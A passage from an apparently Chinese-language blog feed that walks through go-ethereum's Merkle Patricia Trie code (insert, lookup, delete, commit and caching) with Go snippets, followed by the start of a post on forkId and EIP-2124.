&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> matchlen == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, branch, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, &amp;shortNode&#123;key[:matchlen], branch, t.newFlag()&#125;, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p><strong>2.3: 节点为 fullNode</strong></p><p>节点是<code>fullNode</code>(也就是分支节点)，那么直接往对应的孩子节点调用<code>insert</code>方法,然后把对应的孩子节点指向新生成的节点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dirty, nn, err := t.insert(n.Children[key[<span class="number">0</span>]], <span class="built_in">append</span>(prefix, key[<span class="number">0</span>]), key[<span class="number">1</span>:], value)</span><br><span class="line"><span class="keyword">if</span> !dirty || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, n, err</span><br><span class="line">&#125;</span><br><span class="line">n = n.<span class="built_in">copy</span>()</span><br><span class="line">n.flags = t.newFlag()</span><br><span class="line">n.Children[key[<span class="number">0</span>]] = nn</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, n, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p><strong>2.4: 节点为 hashnode</strong></p><p>暂时还在数据库中的节点，先调用 <code>t.resolveHash(n, prefix)</code>来加载到内存，然后调用<code>insert</code>方法来插入。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rn, err := t.resolveHash(n, prefix)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">dirty, nn, err := t.insert(rn, prefix, key, value)</span><br><span class="line"><span class="keyword">if</span> !dirty || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, rn, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, nn, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>③：<strong>Trie 树查询值</strong></p><p>其实就是根据输入的<code>hash</code>，找到对应的叶子节点的数据。主要看<code>TryGet</code>方法。</p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162644392.png" alt="image-20220330162644392" style="zoom:50%;" /><p>参数：</p><ul><li><code>origNode</code>：当前查找的起始<strong>node</strong>位置</li><li><code>key</code>：输入要查找的数据的<strong>hash</strong></li><li><code>pos</code>：当前<strong>hash</strong>匹配到第几位</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> tryGet(origNode node, key []<span class="type">byte</span>, pos <span class="type">int</span>) (value []<span class="type">byte</span>, newnode node, didResolve <span class="type">bool</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> n := (origNode).(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>: <span class="comment">//表示当前trie是空树</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> valueNode: <span class="comment">////这就是我们要查找的叶子节点对应的数据</span></span><br><span class="line"><span class="keyword">return</span> n, n, <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *shortNode: <span class="comment">////在叶子节点或者扩展节点匹配</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key)-pos &lt; <span class="built_in">len</span>(n.Key) || !bytes.Equal(n.Key, key[pos:pos+<span class="built_in">len</span>(n.Key)]) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, n, <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">value, newnode, didResolve, err = t.tryGet(n.Val, key, pos+<span class="built_in">len</span>(n.Key))</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; didResolve &#123;</span><br><span class="line">n = n.<span class="built_in">copy</span>()</span><br><span class="line">n.Val = newnode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> value, n, didResolve, err</span><br><span class="line"><span class="keyword">case</span> *fullNode:<span class="comment">//在分支节点匹配</span></span><br><span class="line">value, newnode, didResolve, err = t.tryGet(n.Children[key[pos]], key, pos+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; didResolve &#123;</span><br><span class="line">n = n.<span class="built_in">copy</span>()</span><br><span class="line">n.Children[key[pos]] = newnode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> value, n, didResolve, err</span><br><span class="line"><span class="keyword">case</span> hashNode: <span class="comment">//说明当前节点是轻节点，需要从db中获取</span></span><br><span class="line">child, err := t.resolveHash(n, key[:pos])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, n, <span class="literal">true</span>, err</span><br><span class="line">&#125;</span><br><span class="line">value, newnode, _, err := t.tryGet(child, key, pos)</span><br><span class="line"><span class="keyword">return</span> value, newnode, <span class="literal">true</span>, err</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>didResolve</code>用于判断<code>trie</code>树是否会发生变化，<code>tryGet()</code>只是用来获取数据的，当<code>hashNode</code>去<code>db</code>中获取该<code>node</code>值后需要更新现有的 trie，<code>didResolve</code>就会发生变化。其他就是基本的递归查找树操作。</p><h2 id="删除数据">删除数据</h2><p>从 MPT 中删除数据节点，这比插入数据更加复杂。从树中删除一个节点是容易的，但在 MPT 中删除节点后需要根据前面的改进方案调整结构。 比如，原本是一个分支节点下有两个子节点，现在删除一个子节点后，只有一个子节点的分支节点的存储是无意义的，需要移除并将剩余的子节点上移。 下图是 MPT 中删除数据的流程图。</p><p><a href="https://img.learnblockchain.cn/book_geth/20191203160005.png!de?width=600px"><img src="https://img.learnblockchain.cn/book_geth/20191203160005.png!de?width=600px" alt="以太坊技术与实现-图- MPT中删除数据的流程图"></a>同样，删除数据也是深度递归遍历。先深度查找，抵达数据应处位置，再从下向上依次更新此路径上的节点。 在删除过程中，主要是对删除后节点的调整。有两个原则：</p><ol><li>分支节点至少要有两个子节点，如果只有一个子节点或者没有则需要调整。</li><li>shortNode 的 value 是 shortNode 时可合并。</li></ol><p>删除数据也涉及路径上节点的更新，图中的绿色虚线是表示递归删除节点。</p><h2 id="树更新实例">树更新实例</h2><p>下面，我演示依次将一组数据 romane、romanus、romulus、rubens、ruber、rubicon、rubicunds 插入到 MPT 中时的树结构的变化情况。</p><p>首先依次写入：romane、romanus、romulus 后树的变化如下：</p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162716451.png" alt="image-20220330162716451" style="zoom:50%;" /><p>图中的每一个圆圈均代表一个节点，只是节点的类型不同。需要注意的是，图中的红色字部分，实际是一个短节点（shortNode）。 比如，红色的“roman“ 短节点的 key 为 roman, value 是分支节点。继续写入 rubens、ruber、rubicon 的变化过程如下：</p><p><img src="https://img.learnblockchain.cn/book_geth/20191127165900.png!de" alt="以太坊技术与实现-图-20191127165900.png"></p><h2 id="将节点写入到-Trie-的内存数据库">将节点写入到 Trie 的内存数据库</h2><p>如果要把节点写入到内存数据库，需要序列化，可以先去了解下以太坊的 Rlp 编码。这部分工作由<code>trie.Commit()</code>完成，当<code>trie.Commit(nil)</code>，会执行序列化和缓存等操作，序列化之后是使用的<code>Compact Encoding</code>进行编码，从而达到节省空间的目的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> Commit(onleaf LeafCallback) (root common.Hash, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> t.db == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;commit called on trie with nil database&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">hash, cached, err := t.hashRoot(t.db, onleaf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> common.Hash&#123;&#125;, err</span><br><span class="line">&#125;</span><br><span class="line">t.root = cached</span><br><span class="line"><span class="keyword">return</span> common.BytesToHash(hash.(hashNode)), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码大概讲了这些：</p><ul><li>每次执行<code>Commit()</code>，该 trie 的<code>cachegen</code>就会加 1</li><li><code>Commit()</code>方法返回的是<code>trie.root</code>所指向的<code>node</code>的<code>hash</code>（未编码）</li><li>其中的<code>hashRoot()</code>方法目的是<code>返回trie.root所指向的node的hash</code>以及<code>每个节点都带有各自hash的trie树的root</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为每个node生成一个hash</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> hashRoot(db *Database, onleaf LeafCallback) (node, node, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> t.root == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> hashNode(emptyRoot.Bytes()), <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">h := newHasher(onleaf)</span><br><span class="line"><span class="keyword">defer</span> returnHasherToPool(h)</span><br><span class="line"><span class="keyword">return</span> h.hash(t.root, db, <span class="literal">true</span>) <span class="comment">//为每个节点生成一个未编码的hash</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>hashRoot</code>的核心方法就是 <code>h.hash</code>，它返回了头节点的<code>hash</code>以及每个子节点都带有<code>hash</code>的头节点（Trie.root 指向它），大致做了以下几件事：</p><p>①：<em>如果我们不存储节点，而只是哈希，则从缓存中获取数据</em></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hash, dirty := n.cache(); hash != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> db == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> hash, n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !dirty &#123;</span><br><span class="line"><span class="keyword">switch</span> n.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> *fullNode, *shortNode:</span><br><span class="line"><span class="keyword">return</span> hash, hash, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> hash, n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>②：<em>递归调用<code>h.hashChildren</code>，求出所有的子节点的<code>hash</code>值，再把原有的子节点替换成现在子节点的<code>hash</code>值</em></p><p><strong>2.1:如果节点是<code>shortNode</code></strong></p><p>首先把<code>collapsed.Key从Hex Encoding</code> 替换成 <code>Compact Encoding</code>, 然后递归调用<code>hash</code>方法计算子节点的<code>hash</code>和<code>cache</code>，从而把子节点替换成了子节点的<code>hash</code>值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">collapsed, cached := n.<span class="built_in">copy</span>(), n.<span class="built_in">copy</span>()</span><br><span class="line">collapsed.Key = hexToCompact(n.Key)</span><br><span class="line">cached.Key = common.CopyBytes(n.Key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, ok := n.Val.(valueNode); !ok &#123;</span><br><span class="line">collapsed.Val, cached.Val, err = h.hash(n.Val, db, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> original, original, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> collapsed, cached, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p><strong>2.2:节点是 fullNode</strong></p><p>遍历每个子节点，把子节点替换成子节点的<code>Hash</code>值，否则的化这个节点没有<code>children</code>。直接返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">collapsed, cached := n.<span class="built_in">copy</span>(), n.<span class="built_in">copy</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">16</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> n.Children[i] != <span class="literal">nil</span> &#123;</span><br><span class="line">collapsed.Children[i], cached.Children[i], err = h.hash(n.Children[i], db, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> original, original, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cached.Children[<span class="number">16</span>] = n.Children[<span class="number">16</span>]</span><br><span class="line"><span class="keyword">return</span> collapsed, cached, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>③：<em>存储节点 n 的哈希值，如果我们指定了存储层，它会写对应的键/值对</em></p><p>store()方法主要就做了两件事：</p><ul><li><code>rlp</code>序列化<code>collapsed</code>节点并将其插入 db 磁盘中</li><li>生成当前节点的<code>hash</code></li><li>将节点哈希插入<code>db</code></li></ul><p><strong>3.1：空数据或者 hashNode，则不处理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if _, isHash := n.(hashNode); n == nil || isHash &#123;</span><br><span class="line">return n, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.2:生成节点的 RLP 编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">h.tmp.Reset()                                 // 缓存初始化</span><br><span class="line">if err := rlp.Encode(&amp;h.tmp, n); err != nil &#123; //将当前node序列化</span><br><span class="line">panic(&quot;encode error: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">if len(h.tmp) &lt; 32 &amp;&amp; !force &#123;</span><br><span class="line">return n, nil // Nodes smaller than 32 bytes are stored inside their parent 编码后的node长度小于32，若force为true，则可确保所有节点都被编码</span><br><span class="line">&#125;</span><br><span class="line">//长度过大的，则都将被新计算出来的hash取代</span><br><span class="line">hash, _ := n.cache() //取出当前节点的hash</span><br><span class="line">if hash == nil &#123;</span><br><span class="line">hash = h.makeHashNode(h.tmp) //生成哈希node</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.3:将 Trie 节点合并到中间内存缓存中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hash := common.BytesToHash(hash)</span><br><span class="line">db.lock.Lock()</span><br><span class="line">db.insert(hash, h.tmp, n)</span><br><span class="line">db.lock.Unlock()</span><br><span class="line">// Track external references from account-&gt;storage trie</span><br><span class="line">//跟踪帐户-&gt;存储Trie中的外部引用</span><br><span class="line">if h.onleaf != nil &#123;</span><br><span class="line">switch n := n.(type) &#123;</span><br><span class="line">case *shortNode:</span><br><span class="line">if child, ok := n.Val.(valueNode); ok &#123;  //指向的是分支节点</span><br><span class="line">h.onleaf(child, hash) //用于统计当前节点的信息，比如当前节点有几个子节点，当前有效的节点数</span><br><span class="line">&#125;</span><br><span class="line">case *fullNode:</span><br><span class="line">for i := 0; i &lt; 16; i++ &#123;</span><br><span class="line">if child, ok := n.Children[i].(valueNode); ok &#123;</span><br><span class="line">h.onleaf(child, hash)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止将节点写入到<code>Trie</code>的内存数据库就已经完成了。</p><p><em>如果觉得文章不错可以关注公众号：<strong>区块链技术栈</strong>，详细的所有以太坊源码分析文章内容以及代码资料都在其中。</em></p><h2 id="Trie-树缓存机制">Trie 树缓存机制</h2><p><code>Trie</code>树的结构里面有两个参数， 一个是<code>cachegen</code>,一个是<code>cachelimit</code>。这两个参数就是<code>cache</code>控制的参数。 <code>Trie</code>树每一次调用<code>Commit</code>方法，会导致当前的<code>cachegen</code>增加 1。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> Commit(onleaf LeafCallback) (root common.Hash, err <span class="type">error</span>) &#123;</span><br><span class="line">   ...</span><br><span class="line">    t.cachegen++</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>Trie</code>树插入的时候，会把当前的<code>cachegen</code>存放到节点中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> insert(n node, prefix, key []<span class="type">byte</span>, value node) (<span class="type">bool</span>, node, <span class="type">error</span>) &#123;</span><br><span class="line">            ....</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>, &amp;shortNode&#123;n.Key, nn, t.newFlag()&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Trie)</span></span> newFlag() nodeFlag &#123;</span><br><span class="line">    <span class="keyword">return</span> nodeFlag&#123;dirty: <span class="literal">true</span>, gen: t.cachegen&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>trie.cachegen - node.cachegen &gt; cachelimit</code>，就可以把节点从内存里面拿掉。 也就是说节点经过几次<code>Commit</code>，都没有修改，那么就把节点从内存里面干掉。 只要<code>trie</code>路径上新增或者删除一个节点，整个路径的节点都需要重新实例化，也就是节点中的<code>nodeFlag</code>被初始化了。都需要重新更新到<code>db</code>磁盘。</p><p>拿掉节点过程在 <code>hasher.hash</code>方法中， 这个方法是在<code>commit</code>的时候调用。如果方法的<code>canUnload</code>方法调用返回真，那么就拿掉节点，如果只返回了<code>hash</code>节点，而没有返回<code>node</code>节点，这样节点就没有引用，不久就会被 gc 清除掉。 节点被拿掉之后，会用一个<code>hashNode</code>节点来表示这个节点以及其子节点。 如果后续需要使用，可以通过方法把这个节点加载到内存里面来。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hasher)</span></span> hash(n node, db *Database, force <span class="type">bool</span>) (node, node, <span class="type">error</span>) &#123;</span><br><span class="line">   ....</span><br><span class="line">       <span class="comment">// 从缓存中卸载节点。它的所有子节点将具有较低或相等的缓存世代号码。</span></span><br><span class="line">       cacheUnloadCounter.Inc(<span class="number">1</span>)</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1>参考资料：</h1><ol><li><a href="https://learnblockchain.cn/books/geth/part3/mpt.html">详解以太坊默克尔压缩前缀树-MPT :: 以太坊技术与实现 (learnblockchain.cn)</a></li><li><a href="https://mindcarver.cn/2021/01/06/%E6%AD%BB%E7%A3%95%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8BMPT%E6%A0%91-%E4%B8%8A/">死磕以太坊源码分析之 MPT 树-上 | mindcarver</a></li><li><a href="https://mindcarver.cn/2021/01/06/%E6%AD%BB%E7%A3%95%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8BMPT%E6%A0%91-%E4%B8%8B/">死磕以太坊源码分析之 MPT 树-下 | mindcarver</a></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>forkId 解读</title>
    <link href="https://www.blog-blockchain.xyz/geth/forkId/"/>
    <id>https://www.blog-blockchain.xyz/geth/forkId/</id>
    <published>2022-08-25T03:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="EIP-2124">EIP-2124</h2><p>因为 <code>core/forkId</code> 包是 EIP-2124 的实现，因此我们先了解 <a href="https://eips.ethereum.org/EIPS/eip-2124">EIP-2124</a> 的内容。</p><h3 id="目的">目的</h3><blockquote><p><strong>记住以太坊是向后兼容！</strong></p></blockquote><p>以太坊节点之前寻找其他节点的方式是：随机的选择可以连接的节点，再去判断节点是否对自己有用。但是其他的节点可能是主网节点、测试网节点、私网节点、共识机制不一致的节点，这样“盲目”的寻找会浪费资源。</p><p>于是这个提案希望在连接前，其他节点可以发送自己的链配置，实现精确连接到有用节点。这个传递的信息在提案中被称作 <code>fork identifier</code>，它实现如下功能：</p><ul><li>如果两个节点在不同的网络上，他们不应该考虑连接。</li><li>如果硬分叉通过，升级的节点应该拒绝未升级的节点。</li><li>如果两条链有相同的创世区块配置和链配置，但没有分叉（ETH / ETC），它们应该拒绝连接。</li></ul><p>这个提案并没有完整地处理分叉的问题，例如对于分叉 A、B、C，它没有单独处理每个分叉。</p><h3 id="具体实现方式">具体实现方式</h3><ul><li><strong><code>FORK_HASH</code></strong>: 创世配置哈希和分叉区块高度的校验和，4 字节。<ul><li>分叉的区块高度按照顺序，计算 CRC32 校验和。</li><li>分叉的区块高度视作 <code>uint64</code>，计算校验和时按照大端序。</li><li>如果创世配置中不包括 Frontier 版本，就不考虑分叉带来的影响。</li></ul></li><li><strong><code>FORK_NEXT</code></strong>: 下一个将分叉的区块高度，如果未知则为 0。</li></ul><p>例如主网的 <code>ForK_HASH</code> 的计算：</p><ul><li>forkhash₀ = <code>0xfc64ec04</code> (Genesis) = <code>CRC32(&lt;genesis-hash&gt;)</code></li><li>forkhash₁ = <code>0x97c2c34c</code> (Homestead) = <code>CRC32(&lt;genesis-hash&gt; || uint64(1150000))</code></li><li>forkhash₂ = <code>0x91d1f948</code> (DAO fork) = <code>CRC32(&lt;genesis-hash&gt; || uint64(1150000) || uint64(1920000))</code></li></ul><p>然后 <code>fork indentifier</code> 定义为 <code>RLP([FORK_HASH, FORK_NEXT])</code>。提案后面给出了详细的例子，这里不再讨论。</p><h3 id="验证规则">验证规则</h3><ul><li>本地和远程节点的 <code>FORK_HASH</code> 匹配，比较当前的区块高度和 <code>FORK_NEXT</code>。这说明当前的两个节点是兼容的，未来的某次分叉后可能不兼容。<ul><li>如果存在远程节点宣布的分叉区块还没有传递给本地节点，但本地节点已经接收了分叉的区块，则断开的当前连接。（因为本地升级了，连接着的远程节点还没有，这就不兼容）</li><li>没有远程节点宣布分叉区块，而且本地节点也没有接收到分叉区块，则继续连接。</li></ul></li><li>如果远程节点的 <code>FORK_HASH</code> 是当前节点的子集，并且远程节点的 <code>FORK_NEXT</code> 与本地节点将接收的分叉高度相同，则连接。<ul><li>远程节点没有实现某些分叉，但是它可以获取信息，虽然后面可能会“渐行渐远”。</li></ul></li><li>如果远程节点的 <code>FORK_HASH</code> 是当前节点的超集，并且本地节点可以在将来的分叉中逐渐与远程节点的 <code>FORK_HASH</code> 相同。连接。</li><li>如果不是前面提到的情况，则拒绝所有连接。</li></ul><h2 id="源码实现">源码实现</h2><h3 id="兼容性错误和生成-ID-的依据">兼容性错误和生成 ID 